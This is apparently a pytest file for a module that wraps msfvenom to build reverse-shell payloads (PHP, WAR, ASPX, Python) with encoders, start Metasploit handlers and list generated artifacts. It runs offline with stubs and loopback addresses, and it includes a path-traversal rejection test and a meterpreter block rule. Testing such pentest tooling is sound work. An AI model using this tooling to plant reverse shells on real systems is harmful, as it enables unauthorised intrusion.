"""Tests for the msfvenom payload-generation lane (payloads/msfvenom_tools.py).

Offline-first: validation paths, argv construction, preset mapping, handler
wiring (stubbed MetasploitClient) — no network, no live MSF. Real-binary
smoke tests are skipif-guarded on msfvenom being installed (it is, on this
box — Debian metasploit-framework) and only exercise LOCAL generation into
a tmp dropbox: no target is ever contacted, no callback fires (lhost is
loopback, the artifact is never triggered).

pytest-compatible AND directly runnable: ``python3 tests/test_msfvenom_tools.py``
(async tests via asyncio.run — no pytest-asyncio dependency).
"""

from __future__ import annotations

import asyncio
import os
import shutil
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import payloads.msfvenom_tools as mv
import payloads.metasploiting as msf_mod
from utils.scope_gate import ScopeGateError

HAS_MSFVENOM = shutil.which("msfvenom") is not None


def _run(coro):
    return asyncio.run(coro)


# --- validation paths (offline) ----------------------------------------------


def test_meterpreter_blocked_like_dispatch():
    for name in ("php/meterpreter/reverse_tcp", "windows/x64/meterpreter_reverse_tcp"):
        r = _run(mv.generate_payload(payload=name, lhost="127.0.0.1", lport=4444))
        assert r["status"] == "Failed", r
        assert "blocked" in r["error"].lower(), r
        assert "AutoLoadExtensions" in r["error"], r  # same reason dispatch gives


def test_requires_payload_or_preset():
    r = _run(mv.generate_payload(lhost="127.0.0.1", lport=4444))
    assert r["status"] == "Failed"
    assert "No payload" in r["error"]


def test_unknown_preset_lists_valid():
    r = _run(mv.generate_payload(preset="bogus", lhost="127.0.0.1", lport=4444))
    assert r["status"] == "Failed"
    assert "bogus" in r["error"] and "php" in r["error"]


def test_lhost_required():
    r = _run(mv.generate_payload(preset="php", lhost="", lport=4444))
    assert r["status"] == "Failed"
    assert "lhost" in r["error"].lower()


def test_lport_range():
    r = _run(mv.generate_payload(preset="php", lhost="127.0.0.1", lport=99999))
    assert r["status"] == "Failed" and "65535" in r["error"]
    r = _run(mv.generate_payload(preset="php", lhost="127.0.0.1", lport=0))
    assert r["status"] == "Failed"


def test_iterations_need_encoder():
    r = _run(mv.generate_payload(preset="php", lhost="127.0.0.1", lport=4444, iterations=3))
    assert r["status"] == "Failed"
    assert "encoder" in r["error"]


def test_out_name_rejects_path_separators():
    r = _run(mv.generate_payload(
        preset="php", lhost="127.0.0.1", lport=4444, out_name="../evil.php"))
    assert r["status"] == "Failed"
    assert "out_name" in r["error"]


def test_preset_table_defaults():
    # Every preset maps to a non-meterpreter payload + a matching format/ext,
    # and the handler-compatible default payloads the docs promise are there.
    assert mv.PRESETS["php"] == ("php/reverse_php", "raw", ".php")
    assert mv.PRESETS["war"] == ("java/jsp_shell_reverse_tcp", "war", ".war")
    assert mv.PRESETS["aspx"] == ("windows/x64/shell_reverse_tcp", "aspx", ".aspx")
    for name, (payload, _fmt, _ext) in mv.PRESETS.items():
        assert "meterpreter" not in payload, name
        assert "/" in payload, name  # full msfvenom payload name


# --- argv construction + envelope (faked msfvenom) ---------------------------


def test_generate_builds_correct_argv(tmp_path, monkeypatch):
    """Fake subprocess.run records the argv; the out file is written by the
    fake so the envelope's sha256/size can be verified."""
    blob = b"#!/usr/bin/env python3\n# fake stager\n"
    recorded = {}

    def fake_run(argv, **kwargs):
        recorded["argv"] = argv
        recorded["kwargs"] = kwargs
        out = argv[argv.index("-o") + 1]
        Path(out).write_bytes(blob)
        return subprocess.CompletedProcess(
            argv, 0, stdout=f"Payload size: {len(blob)} bytes\n", stderr=""
        )

    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
    monkeypatch.setattr(mv.subprocess, "run", fake_run)

    r = _run(mv.generate_payload(
        payload="python/shell_reverse_tcp", lhost="10.0.0.5", lport=9001,
        out_name="stager.py", encoder="x86/shikata_ga_nai", iterations=2,
        badchars="\\x00\\x0a", platform="linux", arch="x64",
        extra_options={"URI": "/x"},
    ))
    assert r["status"] == "Success", r
    argv = recorded["argv"]
    assert argv[1:4] == ["-p", "python/shell_reverse_tcp", "LHOST=10.0.0.5"]
    assert "LPORT=9001" in argv and "URI=/x" in argv
    assert argv[argv.index("-f") + 1] == "raw"
    assert argv[argv.index("-o") + 1] == str(tmp_path / "stager.py")
    assert argv[argv.index("-e") + 1] == "x86/shikata_ga_nai"
    assert argv[argv.index("-i") + 1] == "2"
    assert argv[argv.index("-b") + 1] == "\\x00\\x0a"
    assert argv[argv.index("--platform") + 1] == "linux"
    assert argv[argv.index("-a") + 1] == "x64"
    # envelope is honest about the artifact
    import hashlib
    assert r["sha256"] == hashlib.sha256(blob).hexdigest()
    assert r["size_bytes"] == len(blob)
    assert r["out_path"] == str(tmp_path / "stager.py")


def test_generate_surfaces_msfvenom_failure(tmp_path, monkeypatch):
    def fake_run(argv, **kwargs):
        return subprocess.CompletedProcess(
            argv, 1, stdout="", stderr="Invalid Payload Selected: nope/xyz\n"
        )

    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
    monkeypatch.setattr(mv.subprocess, "run", fake_run)
    r = _run(mv.generate_payload(payload="nope/xyz", lhost="127.0.0.1", lport=1))
    assert r["status"] == "Failed"
    assert "Invalid Payload Selected" in r["error"]
    assert "msfvenom" in r["command"]  # argv echoed for the operator


# --- handler wiring (stubbed MSF client) --------------------------------------


class _StubClient:
    def __init__(self, job_id=7, err=None, running=True):
        self._job_id, self._err, self._running = job_id, err, running
        self.calls = []

    @classmethod
    def get_instance(cls):
        return cls._next

    async def _ensure_running(self):
        return self._running

    async def _start_handler_job(self, payload, lhost, lport):
        self.calls.append((payload, lhost, lport))
        return self._job_id, self._err


def _with_stub(monkeypatch, **stub_kwargs):
    stub = _StubClient(**stub_kwargs)
    _StubClient._next = stub
    monkeypatch.setattr(msf_mod, "MetasploitClient", _StubClient)
    return stub


def test_start_handler_success(tmp_path, monkeypatch):
    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
    stub = _with_stub(monkeypatch, job_id=7)
    monkeypatch.setattr(
        mv.subprocess, "run",
        lambda argv, **kw: (
            Path(argv[argv.index("-o") + 1]).write_bytes(b"x"),
            subprocess.CompletedProcess(argv, 0, stdout="", stderr=""),
        )[1],
    )
    r = _run(mv.generate_payload(
        preset="php", lhost="192.168.56.5", lport=4444, start_handler=True))
    assert r["status"] == "Success", r
    assert r["handler"]["started"] is True
    assert r["handler"]["job_id"] == 7
    assert stub.calls == [("php/reverse_php", "192.168.56.5", 4444)]


def test_start_handler_failure_does_not_fail_generation(tmp_path, monkeypatch):
    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
    _with_stub(monkeypatch, job_id=None, err="port in use")
    monkeypatch.setattr(
        mv.subprocess, "run",
        lambda argv, **kw: (
            Path(argv[argv.index("-o") + 1]).write_bytes(b"x"),
            subprocess.CompletedProcess(argv, 0, stdout="", stderr=""),
        )[1],
    )
    r = _run(mv.generate_payload(
        preset="php", lhost="192.168.56.5", lport=4444, start_handler=True))
    assert r["status"] == "Success"  # the artifact exists
    assert r["handler"]["started"] is False
    assert r["handler"]["error"] == "port in use"


def test_start_handler_msf_down_reports_and_continues(tmp_path, monkeypatch):
    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
    _with_stub(monkeypatch, running=False)
    monkeypatch.setattr(
        mv.subprocess, "run",
        lambda argv, **kw: (
            Path(argv[argv.index("-o") + 1]).write_bytes(b"x"),
            subprocess.CompletedProcess(argv, 0, stdout="", stderr=""),
        )[1],
    )
    r = _run(mv.generate_payload(
        preset="php", lhost="192.168.56.5", lport=4444, start_handler=True))
    assert r["status"] == "Success"
    assert r["handler"]["started"] is False
    assert "msfrpcd" in r["handler"]["error"].lower()


# --- list_dropbox -------------------------------------------------------------


def test_list_dropbox_filters_meta_files(tmp_path, monkeypatch):
    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
    (tmp_path / "README.md").write_text("meta")
    (tmp_path / ".gitkeep").write_text("")
    (tmp_path / "shell.php").write_bytes(b"AAA")
    (tmp_path / "evil.bin").write_bytes(b"BBBB")
    r = mv.list_dropbox()
    assert r["status"] == "Success"
    assert r["count"] == 2
    names = {f["name"] for f in r["files"]}
    assert names == {"shell.php", "evil.bin"}
    import hashlib
    by_name = {f["name"]: f for f in r["files"]}
    assert by_name["shell.php"]["sha256"] == hashlib.sha256(b"AAA").hexdigest()
    assert by_name["evil.bin"]["size_bytes"] == 4


# --- real-binary smoke (local generation only; skipif no msfvenom) -------------


def test_real_php_generation_into_dropbox(tmp_path, monkeypatch):
    if not HAS_MSFVENOM:
        import pytest
        pytest.skip("msfvenom not installed")
    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
    r = _run(mv.generate_payload(
        preset="php", lhost="127.0.0.1", lport=4444, out_name="smoke.php"))
    assert r["status"] == "Success", r
    blob = Path(r["out_path"]).read_bytes()
    assert len(blob) == r["size_bytes"] > 0
    assert b"<?php" in blob[:64]  # msfvenom php wrapper
    assert b"127.0.0.1" in blob and b"4444" in blob  # LHOST/LPORT baked in


def test_real_menu_query_filter():
    if not HAS_MSFVENOM:
        import pytest
        pytest.skip("msfvenom not installed")
    r = _run(mv.msfvenom_menu(kind="payloads", query="php/reverse_php"))
    assert r["status"] == "Success"
    assert r["matches"] >= 1
    assert any("php/reverse_php" in row for row in r["rows"])


def test_real_menu_rejects_bad_kind():
    if not HAS_MSFVENOM:
        import pytest
        pytest.skip("msfvenom not installed")
    r = _run(mv.msfvenom_menu(kind="hobbits"))
    assert r["status"] == "Failed"
    assert "payloads" in r["error"]


if __name__ == "__main__":
    passed = failed = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                import inspect
                if len(inspect.signature(fn).parameters):
                    print(f"SKIP (needs fixtures): {name}")
                    continue
                fn()
                passed += 1
                print(f"PASS {name}")
            except Exception as e:  # noqa: BLE001
                failed += 1
                print(f"FAIL {name}: {e}")
    print(f"\n{passed} passed, {failed} failed (fixture-dependent tests skipped)")
    sys.exit(1 if failed else 0)